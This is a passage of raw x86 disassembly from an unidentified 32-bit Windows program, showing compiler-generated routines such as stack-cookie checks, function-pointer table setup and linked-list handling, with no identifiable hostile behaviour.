  403e52:	73 03                	jae    0x403e57
  403e54:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403e57:	50                   	push   %eax
  403e58:	68 ff 0f 00 00       	push   $0xfff
  403e5d:	68 c0 11 41 00       	push   $0x4111c0
  403e62:	ff 15 8c a1 40 00    	call   *0x40a18c
  403e68:	83 c4 0c             	add    $0xc,%esp
  403e6b:	b8 b8 ec 40 00       	mov    $0x40ecb8,%eax
  403e70:	e8 5b fd ff ff       	call   0x403bd0
  403e75:	8b f0                	mov    %eax,%esi
  403e77:	39 7d bc             	cmp    %edi,-0x44(%ebp)
  403e7a:	72 0d                	jb     0x403e89
  403e7c:	8b 55 a8             	mov    -0x58(%ebp),%edx
  403e7f:	52                   	push   %edx
  403e80:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403e86:	83 c4 04             	add    $0x4,%esp
  403e89:	c7 45 bc 0f 00 00 00 	movl   $0xf,-0x44(%ebp)
  403e90:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  403e93:	88 5d a8             	mov    %bl,-0x58(%ebp)
  403e96:	39 7d a0             	cmp    %edi,-0x60(%ebp)
  403e99:	72 0d                	jb     0x403ea8
  403e9b:	8b 45 8c             	mov    -0x74(%ebp),%eax
  403e9e:	50                   	push   %eax
  403e9f:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403ea5:	83 c4 04             	add    $0x4,%esp
  403ea8:	c7 45 a0 0f 00 00 00 	movl   $0xf,-0x60(%ebp)
  403eaf:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
  403eb2:	88 5d 8c             	mov    %bl,-0x74(%ebp)
  403eb5:	39 7d d8             	cmp    %edi,-0x28(%ebp)
  403eb8:	72 0d                	jb     0x403ec7
  403eba:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  403ebd:	51                   	push   %ecx
  403ebe:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  403ec4:	83 c4 04             	add    $0x4,%esp
  403ec7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403eca:	5f                   	pop    %edi
  403ecb:	8b c6                	mov    %esi,%eax
  403ecd:	5e                   	pop    %esi
  403ece:	33 cd                	xor    %ebp,%ecx
  403ed0:	5b                   	pop    %ebx
  403ed1:	e8 aa 42 00 00       	call   0x408180
  403ed6:	8b e5                	mov    %ebp,%esp
  403ed8:	5d                   	pop    %ebp
  403ed9:	c3                   	ret
  403eda:	cc                   	int3
  403edb:	cc                   	int3
  403edc:	cc                   	int3
  403edd:	cc                   	int3
  403ede:	cc                   	int3
  403edf:	cc                   	int3
  403ee0:	55                   	push   %ebp
  403ee1:	8b ec                	mov    %esp,%ebp
  403ee3:	81 ec 0c 08 00 00    	sub    $0x80c,%esp
  403ee9:	a1 18 e0 40 00       	mov    0x40e018,%eax
  403eee:	33 c5                	xor    %ebp,%eax
  403ef0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ef3:	53                   	push   %ebx
  403ef4:	56                   	push   %esi
  403ef5:	57                   	push   %edi
  403ef6:	33 db                	xor    %ebx,%ebx
  403ef8:	68 ff 03 00 00       	push   $0x3ff
  403efd:	8d 85 f9 fb ff ff    	lea    -0x407(%ebp),%eax
  403f03:	53                   	push   %ebx
  403f04:	50                   	push   %eax
  403f05:	88 9d f8 fb ff ff    	mov    %bl,-0x408(%ebp)
  403f0b:	e8 28 4c 00 00       	call   0x408b38
  403f10:	83 c4 0c             	add    $0xc,%esp
  403f13:	68 ff 03 00 00       	push   $0x3ff
  403f18:	8d 8d f9 f7 ff ff    	lea    -0x807(%ebp),%ecx
  403f1e:	53                   	push   %ebx
  403f1f:	51                   	push   %ecx
  403f20:	88 9d f8 f7 ff ff    	mov    %bl,-0x808(%ebp)
  403f26:	e8 0d 4c 00 00       	call   0x408b38
  403f2b:	83 c4 0c             	add    $0xc,%esp
  403f2e:	68 00 30 41 00       	push   $0x413000
  403f33:	ff 15 44 a0 40 00    	call   *0x40a044
  403f39:	b8 b8 e8 40 00       	mov    $0x40e8b8,%eax
  403f3e:	8d 50 01             	lea    0x1(%eax),%edx
  403f41:	8a 08                	mov    (%eax),%cl
  403f43:	40                   	inc    %eax
  403f44:	3a cb                	cmp    %bl,%cl
  403f46:	75 f9                	jne    0x403f41
  403f48:	2b c2                	sub    %edx,%eax
  403f4a:	3b c3                	cmp    %ebx,%eax
  403f4c:	75 75                	jne    0x403fc3
  403f4e:	bb b8 e8 40 00       	mov    $0x40e8b8,%ebx
  403f53:	e8 98 f0 ff ff       	call   0x402ff0
  403f58:	83 ec 1c             	sub    $0x1c,%esp
  403f5b:	8b f4                	mov    %esp,%esi
  403f5d:	8b c3                	mov    %ebx,%eax
  403f5f:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  403f66:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  403f6d:	89 a5 f4 f7 ff ff    	mov    %esp,-0x80c(%ebp)
  403f73:	c6 06 00             	movb   $0x0,(%esi)
  403f76:	8d 50 01             	lea    0x1(%eax),%edx
  403f79:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403f80:	8a 08                	mov    (%eax),%cl
  403f82:	40                   	inc    %eax
  403f83:	84 c9                	test   %cl,%cl
  403f85:	75 f9                	jne    0x403f80
  403f87:	2b c2                	sub    %edx,%eax
  403f89:	8b f8                	mov    %eax,%edi
  403f8b:	b8 b8 e8 40 00       	mov    $0x40e8b8,%eax
  403f90:	e8 eb 30 00 00       	call   0x407080
  403f95:	e8 86 f2 ff ff       	call   0x403220
  403f9a:	83 c4 1c             	add    $0x1c,%esp
  403f9d:	3c 01                	cmp    $0x1,%al
  403f9f:	75 22                	jne    0x403fc3
  403fa1:	e8 ea ef ff ff       	call   0x402f90
  403fa6:	68 30 a6 40 00       	push   $0x40a630
  403fab:	68 a0 a7 40 00       	push   $0x40a7a0
  403fb0:	68 00 04 00 00       	push   $0x400
  403fb5:	68 b8 e8 40 00       	push   $0x40e8b8
  403fba:	ff 15 30 a2 40 00    	call   *0x40a230
  403fc0:	83 c4 10             	add    $0x10,%esp
  403fc3:	b9 b8 e8 40 00       	mov    $0x40e8b8,%ecx
  403fc8:	e8 53 ea ff ff       	call   0x402a20
  403fcd:	8b 15 00 30 41 00    	mov    0x413000,%edx
  403fd3:	8b 35 08 a2 40 00    	mov    0x40a208,%esi
  403fd9:	52                   	push   %edx
  403fda:	68 b8 ec 40 00       	push   $0x40ecb8
  403fdf:	68 b8 e8 40 00       	push   $0x40e8b8
  403fe4:	68 a8 a7 40 00       	push   $0x40a7a8
  403fe9:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  403fef:	68 00 04 00 00       	push   $0x400
  403ff4:	50                   	push   %eax
  403ff5:	ff d6                	call   *%esi
  403ff7:	8b 3d 8c a1 40 00    	mov    0x40a18c,%edi
  403ffd:	8d 8d f8 fb ff ff    	lea    -0x408(%ebp),%ecx
  404003:	51                   	push   %ecx
  404004:	68 00 04 00 00       	push   $0x400
  404009:	68 b8 ec 40 00       	push   $0x40ecb8
  40400e:	ff d7                	call   *%edi
  404010:	8b 15 00 30 41 00    	mov    0x413000,%edx
  404016:	83 c4 24             	add    $0x24,%esp
  404019:	52                   	push   %edx
  40401a:	68 b8 f0 40 00       	push   $0x40f0b8
  40401f:	68 b0 a7 40 00       	push   $0x40a7b0
  404024:	8d 85 f8 f7 ff ff    	lea    -0x808(%ebp),%eax
  40402a:	68 00 04 00 00       	push   $0x400
  40402f:	50                   	push   %eax
  404030:	ff d6                	call   *%esi
  404032:	83 c4 14             	add    $0x14,%esp
  404035:	8d 8d f8 f7 ff ff    	lea    -0x808(%ebp),%ecx
  40403b:	51                   	push   %ecx
  40403c:	68 00 04 00 00       	push   $0x400
  404041:	68 b8 f0 40 00       	push   $0x40f0b8
  404046:	ff d7                	call   *%edi
  404048:	83 c4 0c             	add    $0xc,%esp
  40404b:	e8 60 fc ff ff       	call   0x403cb0
  404050:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404053:	5f                   	pop    %edi
  404054:	5e                   	pop    %esi
  404055:	33 cd                	xor    %ebp,%ecx
  404057:	5b                   	pop    %ebx
  404058:	e8 23 41 00 00       	call   0x408180
  40405d:	8b e5                	mov    %ebp,%esp
  40405f:	5d                   	pop    %ebp
  404060:	c3                   	ret
  404061:	cc                   	int3
  404062:	cc                   	int3
  404063:	cc                   	int3
  404064:	cc                   	int3
  404065:	cc                   	int3
  404066:	cc                   	int3
  404067:	cc                   	int3
  404068:	cc                   	int3
  404069:	cc                   	int3
  40406a:	cc                   	int3
  40406b:	cc                   	int3
  40406c:	cc                   	int3
  40406d:	cc                   	int3
  40406e:	cc                   	int3
  40406f:	cc                   	int3
  404070:	55                   	push   %ebp
  404071:	8b ec                	mov    %esp,%ebp
  404073:	56                   	push   %esi
  404074:	8b 75 08             	mov    0x8(%ebp),%esi
  404077:	85 f6                	test   %esi,%esi
  404079:	74 45                	je     0x4040c0
  40407b:	6a 2c                	push   $0x2c
  40407d:	6a 00                	push   $0x0
  40407f:	56                   	push   %esi
  404080:	e8 b3 4a 00 00       	call   0x408b38
  404085:	83 c4 0c             	add    $0xc,%esp
  404088:	c7 46 0c 70 40 40 00 	movl   $0x404070,0xc(%esi)
  40408f:	c7 46 10 d0 40 40 00 	movl   $0x4040d0,0x10(%esi)
  404096:	c7 46 28 80 41 40 00 	movl   $0x404180,0x28(%esi)
  40409d:	c7 46 1c 20 41 40 00 	movl   $0x404120,0x1c(%esi)
  4040a4:	c7 46 24 60 41 40 00 	movl   $0x404160,0x24(%esi)
  4040ab:	c7 46 18 00 41 40 00 	movl   $0x404100,0x18(%esi)
  4040b2:	c7 46 20 40 41 40 00 	movl   $0x404140,0x20(%esi)
  4040b9:	c7 46 14 f0 40 40 00 	movl   $0x4040f0,0x14(%esi)
  4040c0:	5e                   	pop    %esi
  4040c1:	5d                   	pop    %ebp
  4040c2:	c3                   	ret
  4040c3:	cc                   	int3
  4040c4:	cc                   	int3
  4040c5:	cc                   	int3
  4040c6:	cc                   	int3
  4040c7:	cc                   	int3
  4040c8:	cc                   	int3
  4040c9:	cc                   	int3
  4040ca:	cc                   	int3
  4040cb:	cc                   	int3
  4040cc:	cc                   	int3
  4040cd:	cc                   	int3
  4040ce:	cc                   	int3
  4040cf:	cc                   	int3
  4040d0:	55                   	push   %ebp
  4040d1:	8b ec                	mov    %esp,%ebp
  4040d3:	8b 45 08             	mov    0x8(%ebp),%eax
  4040d6:	85 c0                	test   %eax,%eax
  4040d8:	74 09                	je     0x4040e3
  4040da:	50                   	push   %eax
  4040db:	e8 90 ff ff ff       	call   0x404070
  4040e0:	83 c4 04             	add    $0x4,%esp
  4040e3:	5d                   	pop    %ebp
  4040e4:	c3                   	ret
  4040e5:	cc                   	int3
  4040e6:	cc                   	int3
  4040e7:	cc                   	int3
  4040e8:	cc                   	int3
  4040e9:	cc                   	int3
  4040ea:	cc                   	int3
  4040eb:	cc                   	int3
  4040ec:	cc                   	int3
  4040ed:	cc                   	int3
  4040ee:	cc                   	int3
  4040ef:	cc                   	int3
  4040f0:	55                   	push   %ebp
  4040f1:	8b ec                	mov    %esp,%ebp
  4040f3:	8b 45 08             	mov    0x8(%ebp),%eax
  4040f6:	85 c0                	test   %eax,%eax
  4040f8:	75 02                	jne    0x4040fc
  4040fa:	5d                   	pop    %ebp
  4040fb:	c3                   	ret
  4040fc:	8b 00                	mov    (%eax),%eax
  4040fe:	5d                   	pop    %ebp
  4040ff:	c3                   	ret
  404100:	55                   	push   %ebp
  404101:	8b ec                	mov    %esp,%ebp
  404103:	8b 45 08             	mov    0x8(%ebp),%eax
  404106:	85 c0                	test   %eax,%eax
  404108:	75 02                	jne    0x40410c
  40410a:	5d                   	pop    %ebp
  40410b:	c3                   	ret
  40410c:	8b 40 04             	mov    0x4(%eax),%eax
  40410f:	5d                   	pop    %ebp
  404110:	c3                   	ret
  404111:	cc                   	int3
  404112:	cc                   	int3
  404113:	cc                   	int3
  404114:	cc                   	int3
  404115:	cc                   	int3
  404116:	cc                   	int3
  404117:	cc                   	int3
  404118:	cc                   	int3
  404119:	cc                   	int3
  40411a:	cc                   	int3
  40411b:	cc                   	int3
  40411c:	cc                   	int3
  40411d:	cc                   	int3
  40411e:	cc                   	int3
  40411f:	cc                   	int3
  404120:	55                   	push   %ebp
  404121:	8b ec                	mov    %esp,%ebp
  404123:	8b 45 08             	mov    0x8(%ebp),%eax
  404126:	85 c0                	test   %eax,%eax
  404128:	75 02                	jne    0x40412c
  40412a:	5d                   	pop    %ebp
  40412b:	c3                   	ret
  40412c:	8b 40 08             	mov    0x8(%eax),%eax
  40412f:	5d                   	pop    %ebp
  404130:	c3                   	ret
  404131:	cc                   	int3
  404132:	cc                   	int3
  404133:	cc                   	int3
  404134:	cc                   	int3
  404135:	cc                   	int3
  404136:	cc                   	int3
  404137:	cc                   	int3
  404138:	cc                   	int3
  404139:	cc                   	int3
  40413a:	cc                   	int3
  40413b:	cc                   	int3
  40413c:	cc                   	int3
  40413d:	cc                   	int3
  40413e:	cc                   	int3
  40413f:	cc                   	int3
  404140:	55                   	push   %ebp
  404141:	8b ec                	mov    %esp,%ebp
  404143:	8b 45 08             	mov    0x8(%ebp),%eax
  404146:	85 c0                	test   %eax,%eax
  404148:	74 05                	je     0x40414f
  40414a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40414d:	89 08                	mov    %ecx,(%eax)
  40414f:	5d                   	pop    %ebp
  404150:	c3                   	ret
  404151:	cc                   	int3
  404152:	cc                   	int3
  404153:	cc                   	int3
  404154:	cc                   	int3
  404155:	cc                   	int3
  404156:	cc                   	int3
  404157:	cc                   	int3
  404158:	cc                   	int3
  404159:	cc                   	int3
  40415a:	cc                   	int3
  40415b:	cc                   	int3
  40415c:	cc                   	int3
  40415d:	cc                   	int3
  40415e:	cc                   	int3
  40415f:	cc                   	int3
  404160:	55                   	push   %ebp
  404161:	8b ec                	mov    %esp,%ebp
  404163:	8b 45 08             	mov    0x8(%ebp),%eax
  404166:	85 c0                	test   %eax,%eax
  404168:	74 06                	je     0x404170
  40416a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40416d:	89 48 04             	mov    %ecx,0x4(%eax)
  404170:	5d                   	pop    %ebp
  404171:	c3                   	ret
  404172:	cc                   	int3
  404173:	cc                   	int3
  404174:	cc                   	int3
  404175:	cc                   	int3
  404176:	cc                   	int3
  404177:	cc                   	int3
  404178:	cc                   	int3
  404179:	cc                   	int3
  40417a:	cc                   	int3
  40417b:	cc                   	int3
  40417c:	cc                   	int3
  40417d:	cc                   	int3
  40417e:	cc                   	int3
  40417f:	cc                   	int3
  404180:	55                   	push   %ebp
  404181:	8b ec                	mov    %esp,%ebp
  404183:	8b 45 08             	mov    0x8(%ebp),%eax
  404186:	85 c0                	test   %eax,%eax
  404188:	74 06                	je     0x404190
  40418a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40418d:	89 48 08             	mov    %ecx,0x8(%eax)
  404190:	5d                   	pop    %ebp
  404191:	c3                   	ret
  404192:	cc                   	int3
  404193:	cc                   	int3
  404194:	cc                   	int3
  404195:	cc                   	int3
  404196:	cc                   	int3
  404197:	cc                   	int3
  404198:	cc                   	int3
  404199:	cc                   	int3
  40419a:	cc                   	int3
  40419b:	cc                   	int3
  40419c:	cc                   	int3
  40419d:	cc                   	int3
  40419e:	cc                   	int3
  40419f:	cc                   	int3
  4041a0:	55                   	push   %ebp
  4041a1:	8b ec                	mov    %esp,%ebp
  4041a3:	56                   	push   %esi
  4041a4:	8b 75 08             	mov    0x8(%ebp),%esi
  4041a7:	85 f6                	test   %esi,%esi
  4041a9:	74 4c                	je     0x4041f7
  4041ab:	57                   	push   %edi
  4041ac:	68 f0 00 00 00       	push   $0xf0
  4041b1:	6a 00                	push   $0x0
  4041b3:	56                   	push   %esi
  4041b4:	e8 7f 49 00 00       	call   0x408b38
  4041b9:	83 c4 0c             	add    $0xc,%esp
  4041bc:	c7 86 e4 00 00 00 a0 	movl   $0x4041a0,0xe4(%esi)
  4041c3:	41 40 00 
  4041c6:	c7 86 e8 00 00 00 00 	movl   $0x404200,0xe8(%esi)
  4041cd:	42 40 00 
  4041d0:	c7 86 ec 00 00 00 50 	movl   $0x404250,0xec(%esi)
  4041d7:	42 40 00 
  4041da:	bf 05 00 00 00       	mov    $0x5,%edi
  4041df:	90                   	nop
  4041e0:	56                   	push   %esi
  4041e1:	c7 46 0c 70 40 40 00 	movl   $0x404070,0xc(%esi)
  4041e8:	e8 83 fe ff ff       	call   0x404070
  4041ed:	83 c4 04             	add    $0x4,%esp
  4041f0:	83 c6 2c             	add    $0x2c,%esi
  4041f3:	4f                   	dec    %edi
  4041f4:	75 ea                	jne    0x4041e0
  4041f6:	5f                   	pop    %edi
  4041f7:	5e                   	pop    %esi
  4041f8:	5d                   	pop    %ebp
  4041f9:	c3                   	ret
  4041fa:	cc                   	int3
  4041fb:	cc                   	int3
  4041fc:	cc                   	int3
  4041fd:	cc                   	int3
  4041fe:	cc                   	int3
  4041ff:	cc                   	int3
  404200:	55                   	push   %ebp
  404201:	8b ec                	mov    %esp,%ebp
  404203:	51                   	push   %ecx
  404204:	56                   	push   %esi
  404205:	8b 75 08             	mov    0x8(%ebp),%esi
  404208:	57                   	push   %edi
  404209:	33 ff                	xor    %edi,%edi
  40420b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40420e:	3b f7                	cmp    %edi,%esi
  404210:	75 08                	jne    0x40421a
  404212:	5f                   	pop    %edi
  404213:	33 c0                	xor    %eax,%eax
  404215:	5e                   	pop    %esi
  404216:	8b e5                	mov    %ebp,%esp
  404218:	5d                   	pop    %ebp
  404219:	c3                   	ret
  40421a:	53                   	push   %ebx
  40421b:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40421e:	8b ff                	mov    %edi,%edi
  404220:	8b 46 18             	mov    0x18(%esi),%eax
  404223:	56                   	push   %esi
  404224:	ff d0                	call   *%eax
  404226:	83 c4 04             	add    $0x4,%esp
  404229:	3b c3                	cmp    %ebx,%eax
  40422b:	74 13                	je     0x404240
  40422d:	47                   	inc    %edi
  40422e:	83 c6 2c             	add    $0x2c,%esi
  404231:	83 ff 05             	cmp    $0x5,%edi
  404234:	7c ea                	jl     0x404220
  404236:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404239:	5b                   	pop    %ebx
  40423a:	5f                   	pop    %edi
  40423b:	5e                   	pop    %esi
  40423c:	8b e5                	mov    %ebp,%esp
  40423e:	5d                   	pop    %ebp
  40423f:	c3                   	ret
  404240:	5b                   	pop    %ebx
  404241:	5f                   	pop    %edi
  404242:	8b c6                	mov    %esi,%eax
  404244:	5e                   	pop    %esi
  404245:	8b e5                	mov    %ebp,%esp
  404247:	5d                   	pop    %ebp
  404248:	c3                   	ret
  404249:	cc                   	int3
  40424a:	cc                   	int3
  40424b:	cc                   	int3
  40424c:	cc                   	int3
  40424d:	cc                   	int3
  40424e:	cc                   	int3
  40424f:	cc                   	int3
  404250:	55                   	push   %ebp
  404251:	8b ec                	mov    %esp,%ebp
  404253:	53                   	push   %ebx
  404254:	57                   	push   %edi
  404255:	8b 7d 08             	mov    0x8(%ebp),%edi
  404258:	33 db                	xor    %ebx,%ebx
  40425a:	85 ff                	test   %edi,%edi
  40425c:	75 06                	jne    0x404264
  40425e:	5f                   	pop    %edi
  40425f:	33 c0                	xor    %eax,%eax
  404261:	5b                   	pop    %ebx
  404262:	5d                   	pop    %ebp
  404263:	c3                   	ret
  404264:	56                   	push   %esi
  404265:	33 f6                	xor    %esi,%esi
  404267:	8b 47 14             	mov    0x14(%edi),%eax
  40426a:	57                   	push   %edi
  40426b:	ff d0                	call   *%eax
  40426d:	83 c4 04             	add    $0x4,%esp
  404270:	85 c0                	test   %eax,%eax
  404272:	74 10                	je     0x404284
  404274:	46                   	inc    %esi
  404275:	83 c7 2c             	add    $0x2c,%edi
  404278:	83 fe 05             	cmp    $0x5,%esi
  40427b:	7c ea                	jl     0x404267
  40427d:	5e                   	pop    %esi
  40427e:	5f                   	pop    %edi
  40427f:	8b c3                	mov    %ebx,%eax
  404281:	5b                   	pop    %ebx
  404282:	5d                   	pop    %ebp
  404283:	c3                   	ret
  404284:	8b df                	mov    %edi,%ebx
  404286:	5e                   	pop    %esi
  404287:	5f                   	pop    %edi
  404288:	8b c3                	mov    %ebx,%eax
  40428a:	5b                   	pop    %ebx
  40428b:	5d                   	pop    %ebp
  40428c:	c3                   	ret
  40428d:	cc                   	int3
  40428e:	cc                   	int3
  40428f:	cc                   	int3
  404290:	55                   	push   %ebp
  404291:	8b ec                	mov    %esp,%ebp
  404293:	57                   	push   %edi
  404294:	8b 7d 08             	mov    0x8(%ebp),%edi
  404297:	85 ff                	test   %edi,%edi
  404299:	75 05                	jne    0x4042a0
  40429b:	33 c0                	xor    %eax,%eax
  40429d:	5f                   	pop    %edi
  40429e:	5d                   	pop    %ebp
  40429f:	c3                   	ret
  4042a0:	83 3f 00             	cmpl   $0x0,(%edi)
  4042a3:	53                   	push   %ebx
  4042a4:	56                   	push   %esi
  4042a5:	75 25                	jne    0x4042cc
  4042a7:	68 f0 00 00 00       	push   $0xf0
  4042ac:	ff 15 10 a2 40 00    	call   *0x40a210
  4042b2:	8b f0                	mov    %eax,%esi
  4042b4:	56                   	push   %esi
  4042b5:	c7 86 e4 00 00 00 a0 	movl   $0x4041a0,0xe4(%esi)
  4042bc:	41 40 00 
  4042bf:	e8 dc fe ff ff       	call   0x4041a0
  4042c4:	83 c4 08             	add    $0x8,%esp
  4042c7:	89 37                	mov    %esi,(%edi)
  4042c9:	89 77 04             	mov    %esi,0x4(%edi)
  4042cc:	8b 37                	mov    (%edi),%esi
  4042ce:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4042d1:	8b 86 e8 00 00 00    	mov    0xe8(%esi),%eax
  4042d7:	53                   	push   %ebx
  4042d8:	56                   	push   %esi
  4042d9:	ff d0                	call   *%eax
  4042db:	83 c4 08             	add    $0x8,%esp
  4042de:	85 c0                	test   %eax,%eax
  4042e0:	75 13                	jne    0x4042f5
  4042e2:	8b b6 e0 00 00 00    	mov    0xe0(%esi),%esi
  4042e8:	85 f6                	test   %esi,%esi
  4042ea:	75 e5                	jne    0x4042d1
  4042ec:	8b 4f 0c             	mov    0xc(%edi),%ecx
  4042ef:	57                   	push   %edi
  4042f0:	ff d1                	call   *%ecx
  4042f2:	83 c4 04             	add    $0x4,%esp
  4042f5:	5e                   	pop    %esi
  4042f6:	5b                   	pop    %ebx
  4042f7:	5f                   	pop    %edi
  4042f8:	5d                   	pop    %ebp
  4042f9:	c3                   	ret
  4042fa:	cc                   	int3
  4042fb:	cc                   	int3
  4042fc:	cc                   	int3
  4042fd:	cc                   	int3
  4042fe:	cc                   	int3
  4042ff:	cc                   	int3
  404300:	55                   	push   %ebp
  404301:	8b ec                	mov    %esp,%ebp
  404303:	57                   	push   %edi
  404304:	8b 7d 08             	mov    0x8(%ebp),%edi
  404307:	85 ff                	test   %edi,%edi
  404309:	75 05                	jne    0x404310
  40430b:	33 c0                	xor    %eax,%eax
  40430d:	5f                   	pop    %edi
  40430e:	5d                   	pop    %ebp
  40430f:	c3                   	ret
  404310:	56                   	push   %esi
  404311:	8b 37                	mov    (%edi),%esi
  404313:	85 f6                	test   %esi,%esi
  404315:	75 39                	jne    0x404350
  404317:	68 f0 00 00 00       	push   $0xf0
  40431c:	ff 15 10 a2 40 00    	call   *0x40a210
  404322:	8b f0                	mov    %eax,%esi
  404324:	56                   	push   %esi
  404325:	c7 86 e4 00 00 00 a0 	movl   $0x4041a0,0xe4(%esi)
  40432c:	41 40 00 
  40432f:	e8 6c fe ff ff       	call   0x4041a0
  404334:	89 37                	mov    %esi,(%edi)
  404336:	89 77 04             	mov    %esi,0x4(%edi)
  404339:	8b 86 ec 00 00 00    	mov    0xec(%esi),%eax
  40433f:	56                   	push   %esi
  404340:	ff d0                	call   *%eax
  404342:	83 c4 0c             	add    $0xc,%esp
  404345:	5e                   	pop    %esi
  404346:	5f                   	pop    %edi
  404347:	5d                   	pop    %ebp
  404348:	c3                   	ret
  404349:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404350:	8b 8e ec 00 00 00    	mov    0xec(%esi),%ecx
  404356:	56                   	push   %esi
  404357:	ff d1                	call   *%ecx
  404359:	83 c4 04             	add    $0x4,%esp
  40435c:	85 c0                	test   %eax,%eax
  40435e:	75 48                	jne    0x4043a8
  404360:	8b b6 e0 00 00 00    	mov    0xe0(%esi),%esi
  404366:	85 f6                	test   %esi,%esi
  404368:	75 e6                	jne    0x404350
  40436a:	68 f0 00 00 00       	push   $0xf0
  40436f:	ff 15 10 a2 40 00    	call   *0x40a210
  404375:	8b f0                	mov    %eax,%esi
  404377:	56                   	push   %esi
  404378:	c7 86 e4 00 00 00 a0 	movl   $0x4041a0,0xe4(%esi)
  40437f:	41 40 00 
  404382:	e8 19 fe ff ff       	call   0x4041a0
  404387:	8b 57 04             	mov    0x4(%edi),%edx
  40438a:	89 b2 e0 00 00 00    	mov    %esi,0xe0(%edx)
  404390:	8b 47 04             	mov    0x4(%edi),%eax
  404393:	89 86 dc 00 00 00    	mov    %eax,0xdc(%esi)
  404399:	89 77 04             	mov    %esi,0x4(%edi)
  40439c:	8b 8e ec 00 00 00    	mov    0xec(%esi),%ecx
  4043a2:	56                   	push   %esi
  4043a3:	ff d1                	call   *%ecx
  4043a5:	83 c4 0c             	add    $0xc,%esp
  4043a8:	5e                   	pop    %esi
  4043a9:	5f                   	pop    %edi
  4043aa:	5d                   	pop    %ebp
  4043ab:	c3                   	ret
  4043ac:	cc                   	int3
  4043ad:	cc                   	int3
  4043ae:	cc                   	int3
  4043af:	cc                   	int3
  4043b0:	83 3d c0 21 41 00 00 	cmpl   $0x0,0x4121c0
  4043b7:	74 61                	je     0x40441a
  4043b9:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  4043be:	85 c0                	test   %eax,%eax
  4043c0:	74 58                	je     0x40441a
  4043c2:	56                   	push   %esi
  4043c3:	50                   	push   %eax
  4043c4:	ff 15 14 a0 40 00    	call   *0x40a014
  4043ca:	8b 35 c0 21 41 00    	mov    0x4121c0,%esi
  4043d0:	85 f6                	test   %esi,%esi
  4043d2:	74 0f                	je     0x4043e3
  4043d4:	e8 47 00 00 00       	call   0x404420
  4043d9:	c7 05 c0 21 41 00 00 	movl   $0x0,0x4121c0
  4043e0:	00 00 00 
  4043e3:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  4043e8:	50                   	push   %eax
  4043e9:	ff 15 1c a0 40 00    	call   *0x40a01c
  4043ef:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  4043f4:	85 c0                	test   %eax,%eax
  4043f6:	74 21                	je     0x404419
  4043f8:	50                   	push   %eax
  4043f9:	8b f0                	mov    %eax,%esi
  4043fb:	ff 15 20 a0 40 00    	call   *0x40a020
  404401:	85 f6                	test   %esi,%esi
  404403:	74 0a                	je     0x40440f
  404405:	56                   	push   %esi
  404406:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40440c:	83 c4 04             	add    $0x4,%esp
  40440f:	c7 05 c4 21 41 00 00 	movl   $0x0,0x4121c4
  404416:	00 00 00 
  404419:	5e                   	pop    %esi
  40441a:	c3                   	ret
  40441b:	cc                   	int3
  40441c:	cc                   	int3
  40441d:	cc                   	int3
  40441e:	cc                   	int3
  40441f:	cc                   	int3
  404420:	83 3d b8 11 41 00 00 	cmpl   $0x0,0x4111b8
  404427:	75 07                	jne    0x404430
  404429:	68 dc a5 40 00       	push   $0x40a5dc
  40442e:	eb 0b                	jmp    0x40443b
  404430:	ff 0d b8 11 41 00    	decl   0x4111b8
  404436:	68 04 a6 40 00       	push   $0x40a604
  40443b:	e8 a0 d6 ff ff       	call   0x401ae0
  404440:	83 c4 04             	add    $0x4,%esp
  404443:	68 d8 a5 40 00       	push   $0x40a5d8
  404448:	e8 93 d6 ff ff       	call   0x401ae0
  40444d:	8b 0d bc 11 41 00    	mov    0x4111bc,%ecx
  404453:	83 c4 04             	add    $0x4,%esp
  404456:	85 c9                	test   %ecx,%ecx
  404458:	74 12                	je     0x40446c
  40445a:	8b 01                	mov    (%ecx),%eax
  40445c:	8b 10                	mov    (%eax),%edx
  40445e:	6a 01                	push   $0x1
  404460:	ff d2                	call   *%edx
  404462:	c7 05 bc 11 41 00 00 	movl   $0x0,0x4111bc
  404469:	00 00 00 
  40446c:	56                   	push   %esi
  40446d:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  404473:	83 c4 04             	add    $0x4,%esp
  404476:	8b c6                	mov    %esi,%eax
  404478:	c3                   	ret
  404479:	cc                   	int3
  40447a:	cc                   	int3
  40447b:	cc                   	int3
  40447c:	cc                   	int3
  40447d:	cc                   	int3
  40447e:	cc                   	int3
  40447f:	cc                   	int3
  404480:	55                   	push   %ebp
  404481:	8b ec                	mov    %esp,%ebp
  404483:	83 e4 f8             	and    $0xfffffff8,%esp
  404486:	6a ff                	push   $0xffffffff
  404488:	68 4f 92 40 00       	push   $0x40924f
  40448d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404493:	50                   	push   %eax
  404494:	83 ec 2c             	sub    $0x2c,%esp
  404497:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40449c:	33 c4                	xor    %esp,%eax
  40449e:	89 44 24 24          	mov    %eax,0x24(%esp)
  4044a2:	53                   	push   %ebx
  4044a3:	56                   	push   %esi
  4044a4:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4044a9:	33 c4                	xor    %esp,%eax
  4044ab:	50                   	push   %eax
  4044ac:	8d 44 24 38          	lea    0x38(%esp),%eax
